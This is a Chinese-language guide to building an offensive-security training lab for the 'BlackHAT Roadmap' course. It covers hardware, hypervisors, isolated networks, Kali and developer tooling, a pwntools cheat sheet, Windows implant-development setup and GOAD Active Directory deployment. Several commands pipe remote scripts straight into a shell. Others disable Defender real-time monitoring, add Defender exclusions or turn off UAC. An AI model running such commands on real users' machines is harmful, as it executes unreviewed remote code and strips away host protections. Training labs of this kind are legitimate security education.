# BlackHAT 实验环境搭建指南

**作者：** Sagar Biswas（[@SagarBiswas-MultiHAT](https://github.com/SagarBiswas-MultiHAT)）<br/>
**规范仓库：** [The BlackHAT Roadmap](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap)<br/>
**许可证：** [CC BY-SA 4.0](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap/blob/main/LICENSE-DOCS)<br/>
**版本：** 1.0.0 · 2027 版<br/>

<div align="right">

**世界级操作员环境：2027 版。从零基础设施到 GREATEST 级实验环境**

</div>

**所属：** The BlackHAT Roadmap v0.0.0（0 到 GREATEST）| **状态：** 活文档。随工具演进而更新。

>**配套路线图文档：**
> * **[The BlackHAT Roadmap（规范仓库）](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap)**：主课程、issue 讨论与实时路线图更新。
> * **[主课程（阶段 -1 到 6）](../phases/PHASE_-1.md)**：从底层硬件到顶级作战的零基础到精英级攻击性工程教学大纲。
> * **[BlackHat 长期生存战术](../black-bag/BlackHat_Long-Term_Survival_Tactics.md)**：权威的作战安全、物理作业手法与数字身份架构手册。
> * **[理念：BlackHat 思维模式](Philosophy_The_BlackHat_Mindset.md)**：认知准则、对抗性假设搜寻与原始思维心智模型。
> * **[MITRE ATT&CK 快速参考](MITRE_ATT&CK_Quick_Reference.md)**：企业、ICS 与 ATLAS 技术映射、检测信号与攻击链蓝图。
> * **[工具清单](Tools_Inventory.md)**：与各阶段对齐的权威 300+ 工具目录，覆盖从原语到工具的落地过程。
> * **[资源汇总](Resources_Aggregated.md)**：精选书籍、研究白皮书、会议演讲存档与动手实践平台。
> * **[常见问题](FAQ.md)**：全面的作战与职业转型问答。
> * **[结语](Final_Word.md)**：文档校验统计、研究者署名与前瞻性研究路线图。

> **推荐精选路线图资源：**
> * **[Awesome Cybersecurity Paths](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-paths)**：面向渗透测试人员、红队成员、蓝队成员与安全研究者的精选学习路径。
> * **[Penetration Testing Roadmap](https://github.com/SagarBiswas-MultiHAT/penetration-testing-roadmap)**：实战评估工作流、工具矩阵与项目方法论。
> * **[Awesome Cybersecurity Books](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-books)**：精选攻击性安全与底层系统文献。

---

## 目录

1. [概述与理念](#1-概述与理念)
2. [硬件需求](#2-硬件需求)
3. [虚拟化层选择](#3-虚拟化层选择)
4. [实验网络架构](#4-实验网络架构)
5. [核心虚拟机库](#5-核心虚拟机库)
6. [攻击机：Kali Linux 2024+](#6-攻击机kali-linux-2024)
7. [开发机：Ubuntu 22.04 LTS](#7-开发机ubuntu-2204-lts)
8. [Windows 目标机与植入物开发机](#8-windows-目标机与植入物开发机)
9. [Active Directory 实验环境：GOAD](#9-active-directory-实验环境goad)
10. [恶意软件分析环境](#10-恶意软件分析环境)
11. [内核调试环境](#11-内核调试环境)
12. [容器攻击实验环境](#12-容器攻击实验环境)
13. [云端实验环境替代方案](#13-云端实验环境替代方案)
14. [作战安全层：Whonix + Qubes](#14-作战安全层whonix--qubes)
15. [检测可见性层：DetectionLab](#15-检测可见性层detectionlab)
16. [ICS/SCADA 实验环境](#16-icsscada-实验环境)
17. [硬件破解实验环境](#17-硬件破解实验环境)
18. [漏洞研究与模糊测试实验环境（阶段 5：GREATEST）](#18-漏洞研究与模糊测试实验环境阶段-5greatest)
19. [特种作战实验环境：物理、社会工程与量子（阶段 6）](#19-特种作战实验环境物理社会工程与量子阶段-6)
20. [快照纪律](#20-快照纪律)
21. [逐阶段实验环境演进](#21-逐阶段实验环境演进)
22. [环境验证清单](#22-环境验证清单)
23. [维护计划](#23-维护计划)

---

## 1. 概述与理念

本指南构建一套完整、隔离、模块化的实验环境，支撑 BlackHAT 路线图从第一次抓包到内核 rootkit 开发、自动化浏览器/内核模糊测试、物理访问控制审计乃至后量子密码研究的每一个阶段。实验环境不是一堆虚拟机的堆砌，而是一套有意图的架构：镜像真实企业环境的隔离网络、镜像蓝队可见性的分层分析环境，以及与你当前训练阶段相匹配的递进复杂度。

**核心原则：**

- **隔离不是可选项。** 恶意软件在隔离虚拟机中引爆。攻击流量绝不触碰你的个人网络。作战安全工作始终置于 Tor 之后。在真实网络上的一个失误就足以毁掉数年的成果。
- **快照就是你的版本控制。** 每次实验前，做快照。每次成功后，做快照。干净基线神圣不可侵犯。
- **实验环境随你成长。** 阶段 0 只需要两台虚拟机，阶段 4 需要十二台。阶段 5 与阶段 6 会扩展出专用高吞吐裸机模糊测试实例、物理访问控制测试台和隐蔽现场植入装置。只建当前阶段需要的，随进阶再添基础设施。
- **真实硬件总是更好。** 大部分工作用虚拟机。内核调试（可选）、配合 Intel PT 的高吞吐模糊测试（kAFL/Nyx 必需）、硬件破解（必需）与物理访问测试台（必需）都用裸机。

**本实验环境完整置备后的全貌：**

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Lab_Setup_Guide/1._What_this_lab_builds,_fully_provisioned.png" alt="What this lab builds, fully provisioned" width="600"/>

</td></tr></table>
</div>

---

## 2. 硬件需求

共三个层级。从入门级起步，进入阶段 3 时再升级。

### 层级 1：入门（阶段 0 到阶段 2）

```
CPU:     6 核起步（Intel i5-10 代 / AMD Ryzen 5 5600）
内存:    16 GB 起步（用起来难受但能干活）
存储:    256 GB SSD（优先 NVMe）
GPU:     集成显卡即可
网络:    单网卡（板载）
系统:    任意宿主系统（Windows 或 Linux）
```

**本层级的虚拟机容量：** 可同时运行 2 到 3 台虚拟机。
典型组合：Kali + Ubuntu + 一台目标机。本层级不要运行完整的 AD 实验环境。

### 层级 2：进阶级（阶段 2 到阶段 3）

```
CPU:     8-12 核（Intel i7-12 代 / AMD Ryzen 7 5800X）
内存:    32 GB（认真干活的实际最低配）
存储:    500 GB NVMe SSD 主盘 + 1 TB HDD 或 SSD 作虚拟机存储
GPU:     独立显卡（hashcat：口令破解至少 RTX 3060）
网络:    实验流量专用网卡（PCIe，不要 USB）
系统:    推荐 Linux 宿主（内核相关工作需裸机）
```

**本层级的虚拟机容量：** 可同时运行 4 到 6 台虚拟机。
典型组合：完整 AD 实验环境（3-4 台虚拟机）+ Kali + 开发机。

### 层级 3：高级操作员（阶段 4）

```
CPU:     16+ 核（AMD Ryzen 9 7950X 或 Threadripper / Intel i9-13900K）
内存:    64 GB DDR5 起步（128 GB 为理想配置：完整 GOAD + 沙箱 + 内核工作）
存储:    2 TB NVMe（主盘，PCIe 4.0）+ 4 TB SSD（虚拟机库）
GPU:     RTX 3090 或 4080（hashcat + 机器学习攻击研究）
网络:    双网卡：一块用于对外访问，一块专供实验内部流量
         Intel I225-V 或同级（不要 Realtek：监听模式有驱动问题）
系统:    Linux 宿主（Ubuntu 22.04 LTS 或 Arch Linux 裸机）
         或 Proxmox VE（type-1 虚拟化层：见第 3 节）
```

**本层级的虚拟机容量：** 可同时运行 10 到 14 台虚拟机。
完整组合：GOAD + 攻击机 + 开发机 + FLARE-VM + REMnux + CAPE + DetectionLab + 内核调试机。

### 层级 4：GREATEST 研究与特种作战（阶段 5 与阶段 6）

```
CPU:     24-32+ 核（AMD Threadripper 7000 / Ryzen 9 9950X 或 Intel Core i9-14900KS / Xeon）
         需裸机 Linux 宿主以支持 Intel PT / KVM 硬件虚拟化（kAFL、Nyx、Syzkaller）
内存:    128 GB 到 256 GB DDR5（并行 V8 ASAN 编译 + 多实例虚拟机模糊测试）
存储:    4 TB NVMe Gen4/Gen5（快速 tmpfs / 暂存盘，用于高 IOPS 模糊测试语料）+ 8 TB 存储池
GPU:     RTX 4090 / RTX 6000 Ada（AI 攻击面、本地 LLM 推理、GPU 加速侧信道分析）
网络:    双 10GbE / 2.5GbE 网卡 + 专用隔离实验交换机 + 硬件 Wi-Fi / 蓝牙测试接口
特殊:    阶段 6 硬件套件（开锁工具组、Proxmark3 RDV4、Flipper Zero、Hak5 装备、RF Explorer、NLJD）
```

**本层级的能力：** 自治模糊测试集群（Syzkaller/AFL++ 在隔离核心上 7×24 运行）、实时浏览器 JIT 差分测试、裸机硬件/固件逆向工程，以及实机物理访问控制测试台。

> **关于 GPU 的说明：** 对于阶段 2 的口令攻击，独立显卡没有商量余地。运行在 CPU 上的 `hashcat` 会慢 10 到 100 倍。RTX 3060 破解 NTLM 约为 42 GH/s，而集成显卡不到 1 GH/s。

---

## 3. 虚拟化层选择

### 对比

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Lab_Setup_Guide/2._Hypervisor_Selection.png" alt="Hypervisor Selection" width="1400"/>

</td></tr></table>
</div>

### 方案 A：VMware Workstation Pro（多数人首选）

Broadcom 收购之后，VMware Workstation Pro 于 **2024 年 5 月对个人使用免费**。

- 下载：https://www.broadcom.com/products/software/vmware/workstation-pro（Broadcom 门户，需注册免费账号）
- 版本：17.x（截至 2026/2027 年的当前版本）
- 认真干活时为什么选 VMware 而不是 VirtualBox：
  - 通过网络做 WinDbg 内核调试的必需项（VirtualBox 的管道调试器明显更慢）
  - 嵌套虚拟化支持更好（虚拟机里跑虚拟机：部分阶段 4 工作需要）
  - USB 直通更稳定，适合硬件破解
  - 大型虚拟机的快照操作更快

### 方案 B：Proxmox VE（GREATEST 层级实验机）

Proxmox 是免费、开源、企业级的 type-1 虚拟化层。把它装在一台专用裸机上，就能从任意设备通过浏览器管理一切。

```bash
# 从以下地址下载 Proxmox VE ISO：https://www.proxmox.com/proxmox-virtual-environment
# 用 Rufus 或 dd 写入 U 盘，在裸机上安装
# 安装完成后，通过以下地址访问 Web 界面：https://YOUR_PROXMOX_IP:8006

# 通过 Web 界面上传虚拟机 ISO：Datacenter > Storage > ISO Images > Upload
# 创建虚拟机：点 Create VM 按钮，为每台虚拟机分配核心/内存/存储

# 为 PCI 直通启用 IOMMU（把 GPU/网卡直通给虚拟机）：
# 编辑 /etc/default/grub：在 GRUB_CMDLINE_LINUX_DEFAULT 中加入 intel_iommu=on 或 amd_iommu=on
update-grub && reboot

# 从已配置好的基础虚拟机创建模板（克隆时省时间）：
# 右键虚拟机 > Convert to Template
# 为每台新虚拟机克隆模板：右键 > Clone > Full Clone
```

**为什么 GREATEST 层级选 Proxmox：**
- 可从任意机器通过浏览器管理所有虚拟机
- LXC 容器提供轻量 Linux 环境（比完整虚拟机更快）
- 内置快照与备份，配合 Proxmox Backup Server
- 支持 ZFS 存储，实现即时克隆与原子快照
- 支持网络桥接与 VLAN，无需物理交换机即可搭建贴近现实的多网段实验环境

### 方案 C：VirtualBox（仅限阶段 0 到阶段 2）

免费、跨平台、简单。足以应付阶段 0 到阶段 2。
**不要用于：** Windows 内核调试、嵌套虚拟化、阶段 3 及之后的内核工作。

下载：https://www.virtualbox.org

### 方案 D：KVM + virt-manager（Linux 高级用户）

KVM 内建于 Linux 内核，性能接近原生。推荐给开展阶段 3 及之后内核研究的 Linux 宿主。

```bash
# 安装 KVM 与 virt-manager
sudo apt install -y qemu-kvm libvirt-daemon-system virt-manager bridge-utils
sudo usermod -aG libvirt,kvm $(whoami)

# 启用并启动 libvirt
sudo systemctl enable --now libvirtd

# 打开图形管理器
virt-manager
```

### 方案 E：裸机 Linux 宿主（阶段 5 与 6 研究机）

对于阶段 5 的高吞吐模糊测试（AFL++、Syzkaller、kAFL/Nyx）以及阶段 6 的反作弊/驱动分析，运行在虚拟化层内部会引入转换延迟、妨碍 Intel 处理器追踪（Intel PT）执行，并触发激进的反虚拟机启发式检测。

- **宿主系统：** 在 NVMe Gen4/Gen5 上裸机运行的 Ubuntu 24.04 LTS 或 Arch Linux
- **关键优势：**
  - 直接访问 CPU MSR、性能计数器与 Intel PT 等硬件
  - tmpfs 内存盘执行零转换开销（>10,000 exec/秒）
  - 原生 USB 直通，支持硬件工具（Proxmark3 RDV4、HackRF One、Bus Pirate）
  - 直接 KVM 虚拟化层加速，用于 Syzkaller 来宾虚拟机编排

---

## 4. 实验网络架构

### 网络拓扑总览

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Lab_Setup_Guide/3._Network_Topology_Overview.png" alt="Network Topology Overview" width="1500"/>

</td></tr></table>
</div>

### 网络配置：VMware Workstation

```bash
# 在 VMware Workstation 中：
# 编辑 > 虚拟网络编辑器

# 网络 1：NAT（VMnet8）——仅供攻击机访问互联网
#   子网：192.168.100.0/24（默认 NAT）
#   保持为默认 NAT

# 网络 2：实验内网（VMnet2）
#   类型：仅主机
#   子网：10.10.10.0/24
#   DHCP：关闭（为每台虚拟机手工分配静态 IP）

# 网络 3：AD 实验网（VMnet3）
#   类型：仅主机
#   子网：10.20.20.0/24
#   DHCP：关闭（由 GOAD 负责）

# 网络 4：ICS 网络（VMnet4）
#   类型：仅主机
#   子网：192.168.200.0/24
#   DHCP：关闭

# 网络 5：带外 C2 与植入物隧道（WireGuard wg0 —— 阶段 6）
#   类型：点对多点加密隧道
#   子网：10.200.200.0/24（UDP 51820）
#   端点：VPS 枢纽（10.200.200.1）、现场投递盒（10.200.200.2）、操作员（10.200.200.10）

# 网络 6：Syzkaller QEMU 模糊测试隔离网（VMnet5 或 syz0 tap —— 阶段 5）
#   类型：仅主机 / 隔离 tap 网桥
#   子网：10.0.2.0/24
#   DHCP：由 Syzkaller 管理守护进程负责

# 攻击机（Kali）网卡配置：
#   网卡 1：VMnet8（NAT）——用于访问互联网和下载工具
#   网卡 2：VMnet2（实验内网）——用于攻击实验虚拟机
#   网卡 3：VMnet3（AD 实验网）——用于攻击 GOAD
#   网卡 4：wg0（WireGuard）——用于控制隐蔽投递盒与云端 C2

# 其余所有实验虚拟机：
#   网卡 1：仅 VMnet2（不通互联网）
#   例外：CAPE 沙箱需要 NAT，以便向 Malware Bazaar 提交样本
#   例外：电话 PBX 容器需绑定宿主，以承载 SIP（5060/udp）与 RTP（10000-10050/udp）
```

### 网络配置：Proxmox

```bash
# 在 Proxmox Web 界面中：Datacenter > Node > Network

# 为实验内网创建 Linux 网桥：
# 名称：vmbr1
# IP：10.10.10.1/24（Proxmox 宿主位于实验网上）
# 无网关（隔离）

# 为 AD 实验网创建 Linux 网桥：
# 名称：vmbr2
# IP：10.20.20.1/24

# 为 ICS 网络创建 Linux 网桥：
# 名称：vmbr3
# IP：192.168.200.1/24

# 为 Syzkaller 模糊测试隔离网创建 Linux 网桥（阶段 5）：
# 名称：vmbr4
# IP：10.0.2.1/24

# 在宿主或云端重定向器上配置 WireGuard 接口（阶段 6）：
# wg0：10.200.200.1/24，监听 UDP 51820

# 在每台虚拟机的 Network 标签页中分配网桥
# Kali 同时获得 vmbr0（互联网）与 vmbr1（实验内网），外加 wg0 客户端
# 其余虚拟机只获得 vmbr1（AD 虚拟机用 vmbr2，ICS 用 vmbr3）
```

---

## 5. 核心虚拟机库

完整的虚拟机清单。按下列顺序构建：每行的 Phase 列说明它何时成为必需。

| 虚拟机名称 | 操作系统 / 版本 | vCPU | 内存 | 存储 | 网络 | 阶段 |
|---|---|---|---|---|---|---|
| `kali-attacker` | Kali Linux 2024.x | 4 | 8 GB | 80 GB | NAT + 实验网 | 0 |
| `ubuntu-dev` | Ubuntu 22.04 LTS | 4 | 8 GB | 100 GB | 仅实验网 | 0 |
| `win11-target` | Windows 11 23H2 | 4 | 8 GB | 100 GB | 实验网 + AD 网 | 1 |
| `winserver-dc` | Windows Server 2022 | 4 | 8 GB | 80 GB | 仅 AD 网 | 2 |
| `ubuntu1804-old` | Ubuntu 18.04 LTS | 2 | 4 GB | 40 GB | 仅实验网 | 2 |
| `debian-old` | Debian 10 Buster | 2 | 4 GB | 40 GB | 仅实验网 | 3 |
| `flare-vm` | Windows 10 22H2 | 4 | 8 GB | 150 GB | 仅实验网（不通互联网） | 3 |
| `remnux` | REMnux 7.x | 2 | 4 GB | 60 GB | 仅实验网 | 3 |
| `cape-sandbox` | Ubuntu 20.04 LTS | 4 | 8 GB | 100 GB | NAT + 实验网 | 3 |
| `win11-kdbg` | Windows 11 23H2 | 4 | 8 GB | 100 GB | 仅实验网 | 3 |
| `detectionlab` | 自动置备 | 8 | 16 GB | 200 GB | 仅实验网 | 3 |
| `whonix-gw` | Whonix Gateway | 1 | 512 MB | 20 GB | NAT + Whonix | -1 |
| `whonix-ws` | Whonix Workstation | 2 | 2 GB | 40 GB | 仅 Whonix | -1 |
| `openplc-ics` | Ubuntu 20.04 | 2 | 2 GB | 40 GB | 仅 ICS | 4 |
| `syzkaller-host` | Ubuntu 24.04 LTS（裸机 / KVM） | 16 | 32 GB | 200 GB | Syzkaller Tap / QEMU | 5 |
| `v8-research` | Ubuntu 22.04 LTS | 8 | 32 GB | 150 GB | 仅实验网 | 5 |
| `rpi-dropbox` | Raspberry Pi OS Lite 64 位（物理机 / QEMU） | 4 | 1 GB | 32 GB | 蜂窝 + WireGuard（10.200.200.0/24） | 6 |
| `telephony-pbx` | Debian 12 / Docker（Asterisk） | 2 | 4 GB | 30 GB | 电话桥（SIP/RTP） | 6 |
| `staging-vps` | Debian 12（加固云端 VPS） | 2 | 4 GB | 40 GB | 公网 WAN + WireGuard 枢纽 | 6 |

**GOAD 域**运行在 `winserver-dc`（主域控）上，另有 2 台从同一基础镜像克隆的 Server 2022 虚拟机。
**阶段 5 模糊测试系统**使用专用裸机 KVM 加速与隔离内存盘，以支撑高吞吐变异测试。
**阶段 6 系统**横跨混合拓扑：物理单板计算机硬件（Raspberry Pi Zero 2W / CM4）、本地容器化的 PBX 服务，以及外部云端中转 VPS。

---

## 6. 攻击机：Kali Linux 2024+

### 下载与安装

```bash
# 下载：https://www.kali.org/get-kali/#kali-virtual-machines
# 提供预构建的 VMware 镜像（比 ISO 安装省 30 分钟）
# 始终下载最新的 2024.x 版本
# 导入前先做 SHA256 校验：
sha256sum kali-linux-2024.x-vmware-amd64.7z
# 与以下地址公布的哈希对比：https://www.kali.org/get-kali/

# 导入后：把磁盘扩容到 80 GB
# 在 VMware 中：VM > Settings > Hard Disk > Expand
```

### 首次启动加固

```bash
# 全面更新
sudo apt update && sudo apt full-upgrade -y

# 安装 kali-everything 元包（装齐所有工具：注意，占用 50+ GB）
# 或按类别选择性安装（推荐）：
sudo apt install -y kali-tools-exploitation kali-tools-post-exploitation \
    kali-tools-wireless kali-tools-web kali-tools-forensics \
    kali-tools-sniffing-spoofing kali-tools-passwords kali-tools-reporting

# 核心工具补充（默认 Kali 未包含）
sudo apt install -y \
    golang-go \
    rustc cargo \
    python3-pip python3-venv \
    tmux screen \
    proxychains4 \
    bloodhound neo4j \
    crackmapexec netexec

# 将 BloodHound 更新到最新版
sudo pip3 install bloodhound --break-system-packages

# Golang 工具
go install github.com/OJ/gobuster/v3@latest
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest

# Sliver C2（最新版）
curl https://sliver.sh/install | sudo bash

# Ligolo-ng（隧道工具，在跳板工作中替代 Metasploit 的 socks 代理）
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_linux_amd64.tar.gz
tar -xf ligolo-ng_proxy_linux_amd64.tar.gz
sudo mv proxy /usr/local/bin/ligolo-proxy

# impacket 套件（Python AD 攻击工具集）
sudo pip3 install impacket --break-system-packages

# Certipy（ADCS 攻击）
sudo pip3 install certipy-ad --break-system-packages

# NetExec（持续维护的 CrackMapExec 替代品）
sudo pip3 install netexec --break-system-packages

# evil-winrm
sudo gem install evil-winrm
```

### tmux 配置

```bash
cat > ~/.tmux.conf << 'EOF'
# 用 | 和 - 分割窗格
bind | split-window -h
bind - split-window -v

# 启用鼠标支持
set -g mouse on

# 加大回滚缓冲区
set -g history-limit 50000

# 状态栏：长会话中很有用
set -g status-right '#[fg=green]%H:%M %d-%b-%Y'

# 加快按键重复
set -s escape-time 0
EOF
```

### proxychains4 配置

```bash
# /etc/proxychains4.conf —— 配置通过跳板机的 SOCKS5 隧道
sudo tee /etc/proxychains4.conf << 'EOF'
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5  127.0.0.1 1080
EOF
# 1080 端口是 Ligolo-ng 与 SSH -D 隧道的默认端口
```

---

## 7. 开发机：Ubuntu 22.04 LTS

这台虚拟机是你的主力构建环境，用于漏洞利用开发、工具开发、恶意软件分析脚本，以及任何需要干净、稳定且 glibc 版本已知（2.35）的 Linux 的工作。

### 基础安装

```bash
# 下载：https://ubuntu.com/download/server（22.04.x LTS）
# 或使用桌面版 ISO：https://ubuntu.com/download/desktop
# 安装：选最小安装，随后再补装软件包

# 安装后：完整更新
sudo apt update && sudo apt full-upgrade -y

# 构建基础组件与核心工具链
sudo apt install -y \
    build-essential gcc g++ gdb git vim tmux \
    nasm yasm binutils binutils-aarch64-linux-gnu \
    make cmake ninja-build \
    strace ltrace \
    patchelf upx-ucl \
    checksec \
    file xxd hexdump strings binwalk

# 网络工具
sudo apt install -y \
    net-tools iproute2 iputils-ping \
    wireshark tshark tcpdump \
    nmap netcat-openbsd curl wget \
    dnsutils whois traceroute socat

# 面向 ARM64/MIPS 研究的模拟环境
sudo apt install -y \
    qemu-user-static qemu-system-aarch64 qemu-system-x86 \
    gcc-aarch64-linux-gnu \
    gcc-mipsel-linux-gnu

# Rust 工具链（攻击性 Rust：阶段 4A）
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source ~/.cargo/env
# 安装攻击性开发常用的 Rust crate：
# cargo add windows ntapi winapi（加到项目的 Cargo.toml 中）

# Go 工具链
sudo apt install -y golang-go
# 或获取最新版：https://go.dev/dl/

# 漏洞利用开发用的 Python 包
pip3 install --break-system-packages \
    pwntools scapy cryptography \
    requests beautifulsoup4 \
    z3-solver ropgadget \
    angr cle      \
    frida-tools

# GDB Enhanced Features（GEF）——主力调试界面
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# 备选：pwndbg（风格不同，同样强大）
# git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh

# Ghidra：NSA 出品的免费逆向工程工具
sudo apt install -y openjdk-17-jdk
wget https://github.com/NationalSecurityAgency/ghidra/releases/latest/download/ghidra_*.zip
unzip ghidra_*.zip -d ~/tools/ghidra
echo "alias ghidra='~/tools/ghidra/ghidraRun'" >> ~/.bashrc

# radare2（轻量逆向工具，适合写脚本）
sudo apt install -y radare2
pip3 install r2pipe --break-system-packages

# AFL++（模糊测试：阶段 4D）
sudo apt install -y afl++

# Valgrind（内存错误检测：对漏洞研究很有用）
sudo apt install -y valgrind

# Docker（用于容器攻击实验环境：第 12 节）
curl -fsSL https://get.docker.com | sh
sudo usermod -aG docker $(whoami)

# 核对 glibc 版本（关键：请记下它，它影响漏洞利用的可移植性）
ldd --version | head -1
# 应输出：ldd (Ubuntu GLIBC 2.35-0ubuntu3.x) 2.35
```

### pwntools 速查

```python
from pwn import *

# 每个漏洞利用脚本开头都要设置 context
context.arch = 'amd64'      # 也可为 'i386'、'arm'、'aarch64'
context.os = 'linux'
context.log_level = 'info'  # 需要详细输出时用 'debug'

# 本地进程交互
p = process('./vulnerable_binary')
p.sendline(b"input data")
output = p.recvline()
p.interactive()             # 进入交互式 shell

# 远程交互
r = remote('target.com', 1337)
r.sendline(b"payload")
r.recvuntil(b"$ ")

# 载荷构造
payload  = b"A" * 64            # 填充
payload += p64(0xdeadbeef)      # 8 字节小端地址
payload += p64(0xcafebabe)

# 地址打包/解包
p64(0x400080)           # 打包为 64 位小端
p32(0xdeadbeef)         # 打包为 32 位小端
u64(b"\x80\x00\x40\x00\x00\x00\x00\x00")  # 解包

# ELF 分析
elf = ELF('./binary')
elf.symbols['main']         # main() 的地址
elf.got['printf']           # printf 的 GOT 表项（用于 GOT 覆写）
elf.plt['printf']           # printf 的 PLT 表项（用于 ret2plt）
elf.bss()                   # .bss 段起始地址

# ROP 链构造
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])  # 泄露 libc 中 puts 的地址
rop.call('main')                     # 返回 main 以执行第二阶段
```

### 环境验证

```bash
#!/usr/bin/env bash
# 配置完成后运行，验证各项功能是否正常

echo "=== Compiler Toolchain ==="
gcc --version | head -1
g++ --version | head -1
nasm --version | head -1
rustc --version
go version

echo "=== Python ==="
python3 --version
python3 -c "import pwn; print('[OK] pwntools', pwn.__version__)"
python3 -c "from scapy.all import IP; print('[OK] scapy')"
python3 -c "import angr; print('[OK] angr')"

echo "=== GDB ==="
gdb --version | head -1
gdb -batch -ex "gef version" 2>/dev/null | head -1

echo "=== Reverse Engineering ==="
ghidra --version 2>/dev/null || echo "Run ghidra manually from ~/tools/ghidra"
r2 --version | head -1
objdump --version | head -1

echo "=== glibc ==="
ldd --version | head -1

echo "=== ASLR State ==="
cat /proc/sys/kernel/randomize_va_space   # 正常模式下应为 2

echo "=== Docker ==="
docker --version

echo "=== Java (Ghidra dependency) ==="
java --version

echo "=== Fuzzing ==="
afl-fuzz --help 2>&1 | head -2

echo "=== Done. ==="
```

---

## 8. Windows 目标机与植入物开发机

这台虚拟机有两个用途：在阶段 1 到阶段 3 作为你的攻击目标，在阶段 4 作为 Windows 植入物与驱动的开发环境。

### 基础配置

```powershell
# 下载 Windows 11 开发虚拟机（预构建，90 天评估版）：
# https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/

# 或者 Windows 11 企业版评估 ISO：
# https://www.microsoft.com/en-us/evalcenter/evaluate-windows-11-enterprise

# 导入/安装后：关闭自动更新（后台更新会让快照失去意义）
# 设置 > Windows 更新 > 高级选项 > 暂停更新（拉到最长）
```

### Windows 开发工具

```powershell
# 安装 Visual Studio 2022 社区版（免费）
# 下载：https://visualstudio.microsoft.com/vs/community/
# 选择以下工作负载：
#   - 使用 C++ 的桌面开发
#   - 使用 C++ 的游戏开发（含 Windows SDK 组件）
# 还需勾选的单个组件：
#   - Windows 10/11 SDK（最新版）
#   - MSVC v143 工具集
#   - C++ CMake 工具

# 安装 WinDbg Preview（内核调试器）
winget install Microsoft.WinDbgPreview

# 安装 Sysinternals 套件
winget install Microsoft.Sysinternals

# x64dbg（Windows 用户态调试器）
# 下载：https://x64dbg.com
# 安装 ScyllaHide 插件：https://github.com/x64dbg/ScyllaHide/releases

# PE 分析工具
# PE-bear：https://github.com/hasherezade/pe-bear/releases
# CFF Explorer：https://ntcore.com/?page_id=388
# Detect-It-Easy：https://github.com/horsicq/Detect-It-Easy

# Process Hacker 2（现名 System Informer）
winget install SystemInformer.Unstable

# 安装 VirtualKD-Redux（相比管道传输，WinDbg KD 调试快 10 倍）
# https://github.com/4d61726b/VirtualKD-Redux/releases
# 解压后运行 vminstall.exe（在被调试虚拟机中安装 VMMON 驱动）
# 启动 WinDbg 会话前，先在调试机中运行 vmmon64.exe

# Windows 上的 Python（脚本化，兼容 impacket）
winget install Python.Python.3.11

# Windows 版 git
winget install Git.Git

# 为实验工作配置 Windows Defender 排除项（避免持续干扰）：
Add-MpPreference -ExclusionPath "C:\Tools", "C:\Users\$env:USERNAME\Desktop\Tools"
Add-MpPreference -ExclusionProcess "x64dbg.exe", "windbg.exe", "ida64.exe"
```

### Windows 安全特性参考

```
特性          | 实验环境中的状态 | 切换命令
-----------   | ------------  | -----------------
Windows Defender (real-time) | 植入物开发时关闭 | Set-MpPreference -DisableRealtimeMonitoring $true
SmartScreen   | 实验中关闭 | 通过组策略：Computer Config > Windows Settings > Security Settings
UAC           | 开发时降低 | Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 0
ASLR          | 保持开启（针对它做测试） | ForceRelocateImages 默认为 ON
DEP/NX        | 保持开启（针对它做测试） | bcdedit /set nx AlwaysOn
Test Signing  | 驱动开发时开启 | bcdedit /set testsigning on（需重启）
Kernel Debug  | 阶段 3 实验中开启 | 见第 11 节
HVCI/VBS      | 开启以测试绕过 | Windows 安全中心里的基于虚拟化的安全性（VBS）
```

---

## 9. Active Directory 实验环境：GOAD

GOAD（Game of Active Directory）是 2025 年及以后标准的多域 AD 实验环境。它置备 5 到 6 台 Windows Server 虚拟机，并预置了覆盖阶段 4I 全部攻击手法的错误配置。既然有 GOAD，就不要手工搭建 AD。

### GOAD 概览

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Lab_Setup_Guide/4._GOAD_Overview.png" alt="GOAD Overview" width="850"/>

</td></tr></table>
</div>

### GOAD 安装

```bash
# 前置条件：在你的宿主机上安装（Kali 攻击机或 Ubuntu 开发机）
# GOAD 使用 Vagrant + VirtualBox/VMware 自动置备所有虚拟机

# 安装 Vagrant
wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list
sudo apt update && sudo apt install -y vagrant

# 安装 Ansible（GOAD 的置备器）
sudo apt install -y python3-pip
pip3 install ansible pywinrm --break-system-packages

# 克隆 GOAD
git clone https://github.com/Orange-Cyberdefense/GOAD.git
cd GOAD

# 安装 GOAD 的 Python 依赖
pip3 install -r requirements.txt --break-system-packages

# 查看可用的实验配置
./goad.sh -t check

# 部署 GOAD 实验环境（完整 5 虚拟机版本：推荐）
# Provider：vmware（首选）或 virtualbox
./goad.sh -t install -l GOAD -p vmware -m local

# 轻量版：GOAD-Light（2 台虚拟机，部署更快，覆盖面更小）
./goad.sh -t install -l GOAD-Light -p vmware -m local

# 首次完整部署 GOAD 需要 1 到 2 小时。
# Vagrant 会下载 Windows Server 评估版 ISO，Ansible 负责逐台配置虚拟机。

# 部署完成后，确认所有虚拟机都在运行：
vagrant status

# SSH 登录任意虚拟机进行管理：
vagrant ssh DC01
```

